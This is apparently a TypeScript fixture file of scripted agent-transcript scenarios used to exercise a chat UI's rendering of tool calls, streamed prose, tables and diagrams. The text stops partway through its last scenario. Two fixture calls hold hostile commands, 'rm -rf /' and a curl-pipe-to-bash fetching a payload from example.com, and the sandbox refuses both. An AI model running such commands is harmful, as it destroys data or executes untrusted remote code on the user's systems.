import { TASK_FOLDER_NAMES } from "@instrument-org/workspace/client";

import {
  changedFile,
  file,
  folder,
  OUR_MODEL,
  platformFailure,
  PROJECT_ID,
} from "./parts";
import {
  type Act,
  batch,
  call,
  context,
  emptyStep,
  fail,
  maxSteps,
  notes,
  pause,
  prose,
  reasoning,
  sameStep,
  type Scenario,
  stop,
  unknownTool,
  user,
} from "./script";
import {
  activity,
  chose,
  edited,
  fetched,
  generated,
  imageUnavailable,
  loadedSkill,
  ran,
  ranAndFailed,
  read,
  readMissing,
  searched,
  searchedForSummary,
  searchUnavailable,
  threw,
  wrote,
} from "./tools";

/**
 * A written answer long enough that watching it arrive says something.
 *
 * Held as blocks rather than one literal so no paragraph has to be wrapped to
 * fit the source: a line break inside one of these is markdown, not layout.
 */
const LONG_ANSWER = [
  "## What actually moved",
  "Revenue is up 11% on the quarter, but almost none of that is the price change we shipped in April. Stripping out the two enterprise renewals that happened to land in the same week, the underlying number is closer to 4%, which is the third quarter in a row at roughly that rate. The renewals are real money and they count, but they are not a trend and the deck should not read as though they were.",
  "The more interesting movement is underneath. Self-serve conversion held flat while the number of trials rose by a third, which means the funnel absorbed the extra volume without degrading. That is the first quarter this year where that is true, and it is the number I would lead with.",
  "### The regions",
  "- North is the one that moved, and it moved on volume rather than on price.\n- South is flat, and has been flat for long enough that flat is the forecast.\n- East fell 6%, entirely inside a single account that churned in February.\n- West is too small to read as anything but noise this quarter.",
  "None of these are surprising on their own. Taken together they say the growth is coming from one region and the reporting should stop averaging across four.",
  "### The chart script",
  "The script was reading `q1.csv` for every quarter because the filename was interpolated once and then cached at module scope, so every chart in the last three decks has been drawn from January data. The fix is small and it is in, but it does mean the historical charts are wrong and someone should decide whether to reissue them.",
  "I also moved the axis formatting out of the render path. It was recomputing a currency formatter per data point, which is why the larger charts took several seconds to appear.",
  "### What I would look at next",
  "- Whether the February churn in East was one account or the start of something, which needs the account-level export nobody has pulled yet.\n- Why trial volume rose a third with no change in spend, since that is either a very good organic quarter or an attribution problem.\n- The renewal timing, because two landing in one week is the kind of coincidence that makes the next quarter look like a collapse.",
  "Everything above is in the written summary in the reports folder, with the corrected charts alongside it.",
].join("\n\n");

/**
 * The constructs a word-at-a-time fade has the most trouble with.
 *
 * Kept apart from the answer above so each is quick to replay while the timing
 * is being tuned, and so a shape that reads badly is not buried in prose that
 * reads well. Roughly in order of how much they move:
 *
 * - A table restructures as rows land, and its columns are sized from content
 *   that has not all arrived, so everything already drawn shifts sideways.
 * - An ordered list widens its own gutter as the item count gains a digit,
 *   which moves every item in it at the tenth.
 * - Code is deliberately never wrapped, so inline code appears at full strength
 *   beside prose that is still fading. A fenced block does the same thing at
 *   the size of a paragraph, but it needs a theme to highlight against and
 *   `frames-render` mounts these without one, so this stops at inline.
 * - A link is stubbed while its URL is incomplete, so it is a live-looking
 *   anchor for as long as the href takes to finish.
 * - Text with no spaces in it is one word to the split, and a CJK sentence is
 *   therefore a single span that fades as one block.
 */
const AWKWARD_SHAPES = [
  "## The shapes that move while they arrive",
  "A table is the worst of them, because the column widths are computed from content that has not all landed yet:",
  "| Region | Change | Driver |\n| --- | --- | --- |\n| North | +11% | Volume, not price |\n| South | 0% | Flat for four quarters |\n| East | -6% | One account churned |\n| West | +2% | Too small to read |",
  "An ordered list is the other one. The gutter is sized to the widest marker it will have to draw, so the tenth item moves every item above it:",
  "1. Pull the account-level export.\n2. Split North by cohort.\n3. Check the renewal dates against the contract table.\n4. Re-run the chart script.\n5. Reissue the three decks drawn from January data.\n6. Confirm the currency formatter is out of the render path.\n7. Diff the corrected charts against the originals.\n8. Ask whether the reissue needs a note attached.\n9. File the attribution question.\n10. Close the loop on the February churn.",
  "Code never fades, by design: `pnpm test run` sits at full strength in the middle of a sentence that is still arriving.",
  "> A quote carries the same prose as anything else, but the rule down its side is drawn before the first word of it exists.",
  "A link is a stub until its URL finishes, so [the docs](https://example.com/reports/quarterly) are an anchor pointing nowhere for a moment. A **bold run** and an *italic one* both resolve early enough to be worth watching too.",
  "Anything without spaces in it is one word as far as the split is concerned, which covers a path like /mnt/Reports/2026/quarterly/north-by-cohort-corrected.csv as well as 東京の売上は前期比で十一パーセント上がりました。",
  "---",
  "### A heading with nothing between it and the next one",
  "#### Which is the shape a model reaches for when it is running out of things to say.",
  "One closing paragraph, so the last thing on screen is ordinary prose settling rather than a construct.",
].join("\n\n");

/**
 * Diagrams, in the states a message spends its time in.
 *
 * A diagram is laid out from measured text, follows the app theme, and has to
 * survive a chat column narrower than it is. The last two fences never become
 * diagrams at all -- one cannot parse, one is caught half written -- and both
 * have to stay ordinary code blocks rather than flickering between the two.
 */
const DIAGRAMS = [
  "A flowchart:",
  "```mermaid\ngraph TD\n  A[Prompt] --> B{Needs a tool?}\n  B -->|Yes| C[Run tool]\n  B -->|No| D[Answer]\n  C --> A\n```",
  "A sequence diagram:",
  "```mermaid\nsequenceDiagram\n  participant U as User\n  participant S as Studio\n  participant M as Model\n  U->>S: Send prompt\n  S->>M: Stream request\n  M-->>S: Tokens\n  S-->>U: Rendered markdown\n```",
  "One wider than the column, which must not push the column open:",
  "```mermaid\ngraph LR\n  A[Collect the source] --> B[Check that it parses]\n  B --> C[Render to SVG]\n  C --> D[Constrain to the column]\n  D --> E[Offer the source back]\n```",
  "A fence that never parses, which stays a code block:",
  "```mermaid\ngraph TD\n  A --> ((((\n```",
  "And one caught mid-stream, which also stays a code block until it finishes:",
  "```mermaid\ngraph TD\n  A[Start] --> B[Half written\n```",
].join("\n\n");

/** A file long enough that the card holding it has to decide how much to show. */
const HELPERS = `import { format, parseISO } from "date-fns";

export function formatDate(date: Date, pattern = "yyyy-MM-dd"): string {
  return format(date, pattern);
}

export function parseJSON<T = unknown>(str: string): T {
  return JSON.parse(str) as T;
}

export function slugify(str: string): string {
  return str
    .toLowerCase()
    .trim()
    .replace(/[_-]+/g, "-")
    .replace(/^-+|-+$/g, "");
}`;

/**
 * A whole turn, kept apart from the scenario that plays it so a second one can
 * replay the same acts after something else has already filled the screen. Two
 * copies of a transcript this long would drift the first time either was
 * edited, and the difference between them would stop being the thing under
 * test.
 */
const REAL_TURN: Act[] = [
  user(
    "Go through the quarterly reports, work out what actually moved, fix the chart script if it needs it, and write it up for me.",
  ),
  // Almost every real turn opens like this: a sentence saying what the
  // agent is about to do, before it has announced a phase or called
  // anything. It belongs to no group and sits at the outer edge.
  prose(
    "I will read the four quarterly files and the notes alongside them first, then look at whether the chart script still works, and write up what I find.",
  ),
  reasoning(
    "The reports are per-quarter files with a regional split. Read them first, then the notes, then decide whether the chart is worth fixing.",
  ),

  // A named phase, several calls deep, with the agent thinking part-way
  // through it: reasoning inside a phase folds like any other step, which
  // is only visible where a phase has one.
  activity("Finding the quarterly reports"),
  ran({
    command: "ls /mnt/Reports",
    explanation: "Listing the Reports folder",
    output: "q1.csv\nq2.csv\nq3.csv\nq4.csv\nnotes.md\nchart.py\n",
  }),
  reasoning(
    "There is a notes file alongside the quarters. Read that before the numbers, since it is where anything that would change how they are read would be written down.",
  ),
  read({
    explanation: "Checking the folder notes",
    filePath: "/mnt/Reports/notes.md",
  }),
  prose(
    "Four quarters and a notes file. The notes mention a reclassification in August, which is going to matter for any comparison across it, so I will read all four rather than just the two either side.",
  ),

  // The same phase again, this time as one response asking for four at once.
  activity("Reading each quarter"),
  batch(
    read({ explanation: "Reading Q1", filePath: "/mnt/Reports/q1.csv" }),
    read({ explanation: "Reading Q2", filePath: "/mnt/Reports/q2.csv" }),
    read({ explanation: "Reading Q3", filePath: "/mnt/Reports/q3.csv" }),
    read({ explanation: "Reading Q4", filePath: "/mnt/Reports/q4.csv" }),
  ),
  prose(
    "The reported figures show the north up twelve percent across the year and the south flat. Both of those are suspect until the reclassification is accounted for.",
  ),

  // An unannounced run: no heading, so it has to earn one from what it did.
  ran({
    command: "grep -c reclassified /mnt/Reports/notes.md",
    explanation: "Counting the reclassified accounts",
    output: "412",
  }),
  read({
    explanation: "Reading the account map",
    filePath: "/mnt/Reports/accounts.csv",
  }),
  ran({
    command: "python -c 'print(412 / 3400)'",
    explanation: "Working out the share",
    output: "0.1211764705882353",
  }),
  prose(
    "Four hundred and twelve accounts moved across the regional boundary in August, which is twelve percent of the book. That is the whole of the reported growth, so the real figure is much smaller.",
  ),

  // A run of one, unannounced, between two paragraphs.
  searched({ query: "regional reclassification accounting treatment" }),
  prose(
    "Standard practice is to restate the prior periods so the comparison holds. The files here do not do that.",
  ),

  // A phase that goes wrong, and one that opens on reasoning rather than a
  // call: the first row under a heading is a step either way.
  activity("Fixing the chart script"),
  reasoning(
    "The chart is generated from the same per-quarter files, so it will read the reclassification the same wrong way. Read it before running it.",
  ),
  read({
    explanation: "Reading the chart script",
    filePath: "/mnt/Reports/chart.py",
  }),
  ranAndFailed({
    command: "python /mnt/Reports/chart.py",
    explanation: "Running the chart script",
    output:
      "Traceback (most recent call last):\n  File \"chart.py\", line 22, in <module>\n    plot(totals['north'])\nKeyError: 'north'",
  }),
  readMissing({
    explanation: "Looking for the column map",
    filePath: "/mnt/Reports/columns.json",
  }),
  prose(
    "The script keys on the region names directly, and the reclassification renamed one of them. There is no column map to fall back on.",
  ),
  threw({
    error: "EACCES: permission denied, open '/mnt/Reports/chart.py'",
    explanation: "Patching the chart script in place",
    filePath: "/mnt/Reports/chart.py",
  }),
  prose(
    "That folder is read-only, so the fix goes in a copy under the task instead.",
  ),

  // A long phase, the shape a debugging loop actually produces.
  activity("Getting the chart to build"),
  ...Array.from({ length: 14 }, (_, index) =>
    index % 3 === 0
      ? ran({
          command: `python chart.py --quarter ${(index + 1).toString()}`,
          explanation: `Rendering quarter ${(index + 1).toString()}`,
          output: index === 12 ? "wrote chart.png" : "1 warning",
        })
      : read({
          explanation: `Reading the quarter ${(index + 1).toString()} slice`,
          filePath: `/mnt/Reports/slices/q${(index + 1).toString()}.csv`,
        }),
  ),
  edited({
    explanation: "Keying the chart on the restated regions",
    filePath: "./chart.py",
    newString: "totals[REGION_MAP[name]]",
    oldString: "totals[name]",
  }),
  wrote({
    content: "north,south\n",
    explanation: "Writing the region map",
    filePath: "./regions.csv",
  }),
  pause(),
  ran({
    command: "python chart.py",
    explanation: "Rendering the chart",
    output: "wrote chart.png",
  }),

  reasoning(
    "The chart builds now. The write-up needs to lead with the reclassification, because every number below it is wrong without that context.",
  ),

  prose(
    "## What moved in Q3\n\nOn the reported figures, revenue in the north grew twelve percent against Q2 and the south was flat. Adjusted for the August reclassification, which moved 412 accounts across the regional boundary without any change in the underlying business, the north grew about three percent and the south was slightly up.\n\nThat reverses the story the raw numbers tell, where the south looks like it is losing ground.\n\n### Why the raw numbers are wrong\n\nThe reclassification was an administrative change made in the first week of August. It is recorded in `notes.md` but not reflected in the per-quarter files, which are generated from the account tables directly. Anything comparing Q3 to Q2 on those files alone reads the boundary move as growth.\n\nStandard practice would be to restate the prior periods so the comparison holds. That has not been done here, and until it is, every quarter-on-quarter figure that crosses August is overstated for the north and understated for the south by the same 412 accounts.\n\n### The remaining three percent\n\nWhat is left after the adjustment is concentrated in the last four weeks of the quarter and looks like ordinary seasonal recovery rather than anything structural. Q3 of the prior year shows the same shape at a smaller absolute size, and Q3 of the year before that shows it again.\n\n### The chart\n\nThe chart script keyed on the region names directly, so it broke outright once one of them was renamed. It now goes through a region map, which is written to `regions.csv` alongside it. The rendered chart is in `chart.png` and shows both the reported and the adjusted series, because showing only one of them is how this gets misread again.\n\n### What to do about it\n\nThe per-quarter files should carry the reclassification date, so a comparison across it is at least visible to whoever makes it. Failing that, `notes.md` has to be read alongside them every time, which is the thing that did not happen here and is not going to reliably happen next time either.",
  ),
];

/**
 * The transcripts worth watching, and the ones worth holding still.
 *
 * One of them is a whole turn end to end, and it is the one to reach for:
 * every kind of step, grouped and unannounced runs alternating, prose between
 * them, and enough of it to overflow the viewport several times over, which is
 * the only way the transcript's own scrolling gets exercised at all. The rest
 * are short and each exists for one shape the long one cannot hold still in.
 */
export const scenarios: Scenario[] = [
  {
    about:
      "A whole turn as they really come: it opens by saying what it is about to do, then named phases and unannounced runs alternating, reasoning, failures, commentary between them, and a written answer at the end. Long enough to scroll.",
    id: "a-real-turn",
    name: "A real turn",
    script: REAL_TURN,
  },
  {
    about:
      "The same turn, replayed after an earlier one has already filled the screen. The transcript only follows its own end when there is an end to follow: on a fresh task nothing overflows, so nothing moves, and the jumping that shows up in a real session cannot happen here at all. This is the one to replay with the bottom edge marker on.",
    id: "a-real-turn-scrolled",
    name: "A real turn, already scrolled",
    script: [
      user("Summarize the quarterly reports for me."),
      // Landing whole rather than a few words at a time, which is what history
      // is: a turn that already happened is on screen the moment the task
      // opens. It is also what puts the screen in the state being tested by
      // the second frame rather than the fiftieth.
      prose(LONG_ANSWER, 0),
      ...REAL_TURN,
    ],
  },
  {
    about:
      "One call to every tool the agent has, each with the output it really returns. Turn replay on to see all of them pass through the states a call goes through -- input still arriving, running, done -- and stop on any frame to hold one of those states still.",
    id: "every-tool",
    name: "Every tool",
    script: [
      user("Try everything you can do, and tell me how it went."),
      activity("Working through the tools"),
      chose({
        choices: ["React", "Vue", "Svelte"],
        explanation: "Asking which framework to target",
        question: "Which frontend framework should we use?",
        selected: "React",
      }),
      loadedSkill({
        explanation: "Loading the PDF skill",
        name: "pdf",
        streamedName: "p",
      }),
      read({
        content: HELPERS,
        explanation: "Reading the helpers",
        filePath: "./src/utils/helpers.ts",
        // The path arrives a character at a time, so the chip the row draws is
        // built from half a path for as long as the rest takes.
        streamedPath: "./src/uti",
      }),
      edited({
        explanation: "Switching the middleware to JWTs",
        filePath: "./src/middleware/auth.ts",
        newString: "const payload = verify(token, JWT_SECRET);",
        oldString: 'const apiKey = req.headers["x-api-key"];',
        streamedPath: "./src/middle",
      }),
      wrote({
        content: 'import { describe, expect, it } from "vitest";',
        explanation: "Writing the tests",
        filePath: "./src/utils/helpers.test.ts",
        streamedPath: "./src/utils/hel",
      }),
      ran({
        command: "pnpm test run helpers.test.ts",
        explanation: "Running the new tests",
        output: "Test Files  1 passed (1)\n     Tests  4 passed (4)",
      }),
      fetched({
        explanation: "Reading the configuration guide",
        // The row links to the page it is reading, so the anchor exists before
        // the URL it points at is finished.
        streamedUrl: "https://vitest.dev/con",
        text: "# Configuring Vitest\n\nVitest reads `vite.config.ts` by default. Add a `test` field to it, or keep the test options in a separate `vitest.config.ts` so the two never fight over the same key.",
        url: "https://vitest.dev/config/",
      }),
      searched({
        explanation: "Checking current practice",
        query: "vitest configuration best practices",
      }),
      generated({
        explanation: "Drawing an icon for the library",
        filePath: "./output/helpers-icon",
        parameters: { background: "opaque", quality: "high" },
        prompt:
          "A minimal flat vector icon of interlocking gear and wrench symbols in a blue gradient.",
      }),
      generated({
        explanation: "Drawing the dark variant from the first one",
        filePath: "./output/helpers-icon-dark",
        prompt:
          "The same icon on a deep navy background with glowing cyan accents.",
        sourceImages: ["./output/helpers-icon.png"],
      }),
      // A tool the model invented. The runtime cannot dispatch it, so the row
      // is drawn from nothing but the fact that a call was made.
      unknownTool({ input: { pattern: "TODO" }, output: {} }),
      prose(
        "That is everything: a question answered, a skill loaded, files read, edited and written, tests run, a page fetched, the web searched, two images drawn, and one call for a tool that does not exist.",
      ),
    ],
  },
  {
    about:
      "The same tools, all of them failing. Most of these are the tool itself breaking, which draws as a failed row; the image and search calls instead come back saying nothing is configured to do the work, which is a different row and easy to get wrong.",
    id: "every-tool-fails",
    name: "Every tool fails",
    script: [
      user("Try everything you can do."),
      activity("Working through the tools"),
      call({
        error: "No choices provided",
        input: { choices: [], question: "Which framework?" },
        type: "tool-choose",
      }),
      call({
        error: "Skill 'nonexistent' not found in the registry",
        input: { explanation: "Loading a missing skill", name: "nonexistent" },
        type: "tool-load_skill",
      }),
      call({
        error: "File not found: src/nonexistent.ts",
        input: { filePath: "src/nonexistent.ts" },
        type: "tool-read_file",
      }),
      call({
        error:
          "old_string not found in src/app.ts. The string may have already been changed.",
        input: {
          filePath: "src/app.ts",
          newString: "const x = 1;",
          oldString: "const y = 2;",
        },
        type: "tool-edit_file",
      }),
      threw({
        error: "Invalid path: cannot write outside the task directory",
        explanation: "Writing outside the task",
        filePath: "../outside/file.ts",
      }),
      call({
        error:
          "Invalid command. The available commands are: cp, ls, mkdir, mv, rm, pnpm, tsc, tsx.",
        input: { command: "rm -rf /", explanation: "Deleting everything" },
        type: "tool-bash",
      }),
      call({
        error: "Request to https://example.com/docs timed out after 30s",
        input: {
          explanation: "Reading the docs page",
          url: "https://example.com/docs",
        },
        type: "tool-web_fetch",
      }),
      call({
        error: "Web search request failed: 429 Too Many Requests",
        input: { explanation: "Searching for docs", query: "vitest config" },
        type: "tool-web_search",
      }),
      call({
        error: "Image generation timed out after 120s",
        input: {
          explanation: "Drawing a logo",
          filePath: "./output/logo",
          prompt: "A modern tech logo",
        },
        type: "tool-generate_image",
      }),
      unknownTool({ error: "Tool 'grep' is not available", input: {} }),
      prose("None of that worked. Two of them could not have."),
      searchUnavailable({
        explanation: "Looking for the release notes",
        query: "TypeScript 6.0 release notes",
      }),
      imageUnavailable({
        explanation: "Drawing the sunset",
        filePath: "./output/sunset",
        prompt: "A sunset over mountains",
      }),
    ],
  },
  {
    about:
      "Every tool again with the explanation left off, which a model does more often than it should. The row has nothing of its own to say, so it falls back to naming the tool -- and the heading over a run of them has to be earned from the calls themselves.",
    id: "unexplained",
    name: "Calls with nothing said about them",
    script: [
      user("Just do it, no commentary."),
      chose({
        choices: ["React", "Vue"],
        question: "Which framework?",
        selected: "React",
      }),
      loadedSkill({ name: "pdf" }),
      read({ filePath: "./src/app.ts" }),
      edited({
        filePath: "./src/app.ts",
        newString: 'export const app = "world";',
        oldString: 'export const app = "hello";',
      }),
      wrote({
        content: 'export const app = "world";',
        filePath: "./src/app.ts",
      }),
      ran({ command: "echo hello", output: "hello" }),
      fetched({
        text: "# Getting Started\n\nVitest is a testing framework powered by Vite.",
        url: "https://vitest.dev/guide/",
      }),
      // The other search backend: prose written by a search model rather than
      // the excerpts every other search in this library returns.
      searchedForSummary({
        query: "vitest best practices",
        text: "Keep the test options in `vitest.config.ts` and enable globals so test files do not import `describe`, `it` and `expect`.",
      }),
      generated({
        filePath: "./output/icon",
        prompt: "A minimal flat vector icon.",
      }),
    ],
  },
  {
    about:
      "What a terminal actually sends back: a long passing run, a failing one with stack traces, a multi-line script with its own indentation, and a command the sandbox refused outright.",
    id: "bash",
    name: "Bash output",
    script: [
      user("Run the tests, then the typechecks."),
      prose("Running the test suite."),
      ran({
        command: "pnpm vitest run",
        explanation: "The whole suite",
        output: `PASS src/__tests__/auth.test.ts
  ✓ signs up a new user (14ms)
  ✓ rejects duplicate emails (8ms)
  ✓ issues a JWT on login (11ms)
  ✓ refreshes the access token (9ms)
  ✓ revokes refresh tokens on logout (7ms)

PASS src/__tests__/billing.test.ts
  ✓ creates a checkout session (22ms)
  ✓ handles a webhook signature mismatch (6ms)
  ✓ upgrades the plan on payment success (18ms)
  ✓ downgrades the plan at period end (12ms)

PASS src/__tests__/api.test.ts
  ✓ GET /health returns 200 (3ms)
  ✓ POST /users validates the body (5ms)
  ✓ PUT /users/:id requires auth (4ms)
  ✓ DELETE /users/:id soft-deletes (6ms)
  ✓ rate limits after 100 req/min (31ms)
  ✓ returns 404 for unknown routes (2ms)

Test Suites: 3 passed, 3 total
Tests:       15 passed, 15 total`,
      }),
      prose("Some payment tests are failing."),
      ranAndFailed({
        command: "pnpm vitest run src/__tests__/payments.test.ts",
        explanation: "The payment tests on their own",
        output: `FAIL src/__tests__/payments.test.ts
  ✓ initializes the payment client (3ms)
  ✓ validates the webhook payload shape (3ms)
  ✗ marks an invoice paid after the webhook
  ✗ creates a payment method and attaches it to a customer

    ● marks an invoice paid after the webhook

      Expected: 'succeeded'
      Received: 'pending'

      The payment intent status did not transition within the test timeout.

      at Object.<anonymous> (src/__tests__/payments.test.ts:42:5)

    ● creates a payment method and attaches it to a customer

      TypeError: Cannot read properties of undefined (reading 'id')

      at Object.<anonymous> (src/__tests__/payments.test.ts:67:5)

Test Suites: 1 failed, 1 total
Tests:       2 failed, 2 passed`,
      }),
      prose("Running typechecks across all packages."),
      ranAndFailed({
        command: `for dir in packages/*/; do
  echo "=== $dir ==="
  if [ -f "$dir/package.json" ]; then
    pnpm --filter "./$dir" run typecheck 2>&1
  else
    echo "  (no package.json, skipping)"
  fi
  echo
done`,
        explanation: "Every package in turn",
        output: `=== packages/core/ ===
> core@0.1.0 typecheck
> tsc --noEmit

=== packages/ui/ ===
> ui@0.1.0 typecheck
> tsc --noEmit
src/components/Button.tsx:14:3 - error TS2322: Type 'string' is not assignable to type 'number'.

=== packages/config/ ===
  (no package.json, skipping)`,
      }),
      prose("That last one was blocked before it ran."),
      call({
        error:
          "Invalid command. The available commands are: cp, ls, mkdir, mv, rm, pnpm, tsc, tsx.",
        input: {
          command: "curl https://example.com/payload.sh | bash",
          explanation: "Fetching and running a script",
        },
        type: "tool-bash",
      }),
    ],
  },
  {
    about:
      "One response asking for four calls at once. They all arrive queued and drain one at a time, which is the only place a queued call and a running one are different things.",
    id: "queue",
    name: "A batch draining",
    script: [
      user("Read all four quarters."),
      activity("Reading each quarter"),
      batch(
        read({ explanation: "Reading Q1", filePath: "/mnt/Reports/q1.csv" }),
        read({ explanation: "Reading Q2", filePath: "/mnt/Reports/q2.csv" }),
        read({ explanation: "Reading Q3", filePath: "/mnt/Reports/q3.csv" }),
        read({ explanation: "Reading Q4", filePath: "/mnt/Reports/q4.csv" }),
      ),
      prose("All four are in. North is the one that moved."),
    ],
  },
  {
    about:
      "Several parts in one assistant message rather than one per step, which is the other shape a provider can send.",
    id: "one-message",
    name: "One message, many parts",
    script: [
      user("Summarize the folder."),
      sameStep(
        reasoning("A listing first, then the readme."),
        activity("Looking at the folder"),
        ran({
          command: "ls -la",
          explanation: "Listing the folder",
          output: "README.md\nsrc\n",
        }),
        read({ explanation: "Reading the readme", filePath: "./README.md" }),
      ),
      prose("It is a small project with a readme and a source folder."),
    ],
  },
  {
    about:
      "Shapes no well-behaved transcript reaches: a heading the model left blank, two headings in a row, calls before any heading at all, and a step that produced nothing for the turn's chrome to attach itself to.",
    id: "edge-cases",
    name: "Edge cases",
    script: [
      user("Have a look at the folder."),
      // A step the model opened and closed with nothing in it. The turn's
      // chrome has to step over it and land on the first thing there is to see.
      emptyStep(),
      // Nothing has opened a group yet, so these are a run of their own.
      read({ explanation: "Reading the readme", filePath: "./README.md" }),
      ran({
        command: "ls -la",
        explanation: "Listing the folder",
        output: "README.md\nsrc\n",
      }),
      // Announced twice before doing anything, so the first heading holds
      // nothing at all.
      activity("Looking at the sources"),
      activity("Reading the sources"),
      reasoning("The entry point first, then whatever it pulls in."),
      read({
        explanation: "Reading the entry point",
        filePath: "./src/app.ts",
      }),
      prose("It is a small app with one entry point."),
      // A model can call the tool with a blank title. The row draws nothing, so
      // it must not head a group or indent anything under an empty line.
      activity(""),
      read({ explanation: "Reading the config", filePath: "./src/config.ts" }),
      prose("The config is defaults only."),
    ],
  },
  {
    about:
      "Stopped part-way. The last call never finishes, so nothing on screen is running even though the rows still say they started.",
    id: "stopped",
    name: "Stopped mid-run",
    script: [
      user("Read every quarter."),
      activity("Reading each quarter"),
      read({ explanation: "Reading Q1", filePath: "/mnt/Reports/q1.csv" }),
      read({ explanation: "Reading Q2", filePath: "/mnt/Reports/q2.csv" }),
      pause(),
      stop(),
    ],
  },
  {
    about:
      "A run that hit the unattended step cap. The workspace writes itself a message saying so, which draws nothing at all: the prompt to pick the run back up is the whole of what the reader sees. Turn developer mode on to see the note the model is given on resume.",
    id: "max-steps",
    name: "Stopped at the step cap",
    script: [
      user(
        "Migrate the whole codebase to TypeScript and fix every type error.",
      ),
      prose(
        "Converting files and resolving type errors across the project. This is a large migration, so I will work through the modules one at a time.",
      ),
      activity("Converting the modules"),
      ...Array.from({ length: 4 }, (_, index) =>
        edited({
          explanation: `Converting module ${(index + 1).toString()}`,
          filePath: `./src/modules/${(index + 1).toString()}.js`,
          newString: "export function run(input: string): number {",
          oldString: "export function run(input) {",
        }),
      ),
      maxSteps(200),
    ],
  },
  {
    about:
      "A written answer arriving a few words at a time, over enough frames to watch the text itself rather than the transcript around it. Nothing else happens in it: replay it to judge how prose, headings and lists read while they are still growing.",
    id: "a-long-answer",
    name: "A long answer arriving",
    script: [
      user(
        "Go through the quarterly reports and write up what actually moved.",
      ),
      // Three words a frame, which is about what a delta carries. The default
      // handful of chunks says a row is growing; it cannot say how the growth
      // reads.
      prose(LONG_ANSWER, 150),
    ],
  },
  {
    about:
      "Tables, ordered lists, code, quotes, links and text with no spaces in it, all arriving a few words at a time. The companion to the long answer: that one is for whether ordinary prose reads well, this one is for the constructs that move, restructure or refuse to animate while they arrive.",
    id: "awkward-shapes",
    name: "Shapes that arrive badly",
    script: [
      user("Write it up, and use a table and a numbered list."),
      prose(AWKWARD_SHAPES, 120),
    ],
  },
  {
    about:
      "Diagrams, arriving slowly enough to catch a fence half written. A diagram is laid out from measured text, follows the app theme, and has to survive a column narrower than it is; the last two fences never become diagrams at all and have to stay code blocks rather than flickering between the two.",
    id: "diagrams",
    name: "Diagrams arriving",
    script: [user("Draw me some diagrams."), prose(DIAGRAMS, 90)],
  },
  {
    about:
      "No tools at all: several turns of plain question and answer, with one user message long enough that it has to collapse itself. The plainest transcript there is, which is the one every spacing rule has to look right in first.",
    id: "conversation",
    name: "Just a conversation",
    script: [
      user("What is React?"),
      prose(
        "React is a library for building user interfaces out of components, each of which describes a piece of the screen as a function of its inputs.",
      ),
      user("Can you show me a simple component?"),
      prose(
        "Here is one:\n\n```tsx\nfunction Welcome({ name }: { name: string }) {\n  return <h1>Hello, {name}!</h1>;\n}\n```\n\nIt takes a `name` and renders a greeting.",
      ),
      user(
        `Now configure the build system with all of these:
- TypeScript strict mode and every strict check
- ESLint with the recommended rules and our overrides
- Prettier, so formatting stops being a review topic
- Vitest for unit tests
- Playwright for the end-to-end pass
- CI that deploys on green
- pre-commit hooks for linting and formatting
- and lint every JavaScript and TypeScript file while you are in there`,
      ),
      prose(
        "I will start with the TypeScript configuration and work down the list.",
      ),
    ],
  },
  {
    about:
      "What the user sent along with their message. The first has enough files to make the grid collapse itself, across every folder it sorts by; the second is a pair of folders from the user's own disk, which stack above the files rather than in with them.",
    id: "attachments",
    name: "Attachments",
    script: [
      user(
        "Here is a full attachment grid: types, folders, and the expand control.",
        {
          data: {
            files: [
              file({
                filePath: `${TASK_FOLDER_NAMES.attachments}/hero.png`,
                mimeType: "image/png",
                size: 245_760,
              }),
              file({
                filePath: `${TASK_FOLDER_NAMES.attachments}/brief.md`,
                mimeType: "text/markdown",
              }),
              file({
                filePath: `${TASK_FOLDER_NAMES.attachments}/data.csv`,
                mimeType: "text/csv",
                size: 4096,
              }),
              file({
                filePath: `${TASK_FOLDER_NAMES.attachments}/voice.mp3`,
                mimeType: "audio/mpeg",
                size: 512_000,
              }),
              file({
                filePath: `${TASK_FOLDER_NAMES.output}/summary.pdf`,
                mimeType: "application/pdf",
                size: 88_000,
              }),
              file({
                filePath: `${TASK_FOLDER_NAMES.output}/demo.mp4`,
                mimeType: "video/mp4",
                size: 1_024_000,
              }),
              // Root-level, so they only appear once the grid is expanded.
              file({ filePath: "NOTES.txt" }),
              file({
                filePath: "index.html",
                mimeType: "text/html",
                size: 2048,
              }),
              // The supporting sections, collapsed until "Show more".
              file({ filePath: `${TASK_FOLDER_NAMES.work}/deploy.sh` }),
              file({
                filePath: `${TASK_FOLDER_NAMES.skills}/pdf/SKILL.md`,
                mimeType: "text/markdown",
              }),
              file({
                filePath: `${TASK_FOLDER_NAMES.work}/draft.json`,
                mimeType: "application/json",
              }),
              file({ filePath: "docs/API.md", mimeType: "text/markdown" }),
              file({ filePath: "src/lib/auth.ts", size: 2048 }),
              file({ filePath: "src/components/Button.tsx", size: 1536 }),
            ],
          },
          type: "data-attachments",
        },
      ),
      prose(
        "Six files show to begin with; the rest are behind the expand control, grouped by where they live.",
      ),
      user("Folder rows sit above the compact file attachments.", {
        data: {
          files: [
            file({ filePath: `${TASK_FOLDER_NAMES.attachments}/one-off.txt` }),
          ],
          folders: [
            folder({ access: "read-write", path: "/tmp/workspace/components" }),
            folder({ access: "read-only", path: "/tmp/workspace/research" }),
          ],
        },
        type: "data-attachments",
      }),
      prose(
        "Folders stack into one bordered block; files stay in the compact grid.",
      ),
    ],
  },
  {
    about:
      "Every `data-*` part a message can carry, on the message it rides on in a real session. Most of them draw nothing until developer mode is on, which is the point: turn it on and off here to see what a reader is and is not being told.",
    id: "data-parts",
    name: "Data parts",
    script: [
      context(
        "system",
        "You are an AI coding agent operating inside a live workspace. Prefer small, verifiable changes and read files before editing them.",
      ),
      context(
        "user",
        "Project instructions:\n\n- TypeScript monorepo; prefer named exports.\n- Run checks from the repo root.",
      ),
      user(
        "Redesign the landing page using the attached brief.",
        {
          data: {
            files: [
              file({
                filePath: `${TASK_FOLDER_NAMES.attachments}/brief.md`,
                mimeType: "text/markdown",
                size: 4096,
              }),
            ],
          },
          type: "data-attachments",
        },
        {
          data: {
            instructions: "Prefer Tailwind utilities.",
            projectId: PROJECT_ID,
            projectName: "Marketing Site",
          },
          type: "data-projectContext",
        },
        {
          data: {
            foldersAdded: [
              { access: "read-only", name: "assets", path: "/tmp/assets" },
            ],
            foldersRemoved: [],
            instructions: "Prefer Tailwind utilities. Keep copy concise.",
            instructionsChanged: true,
            projectId: PROJECT_ID,
            projectName: "Marketing Site",
          },
          type: "data-projectChanges",
        },
        { data: { names: ["wireframe"] }, type: "data-skillMentions" },
        {
          data: { text: "Opened from the design review queue." },
          type: "data-intent",
        },
      ),
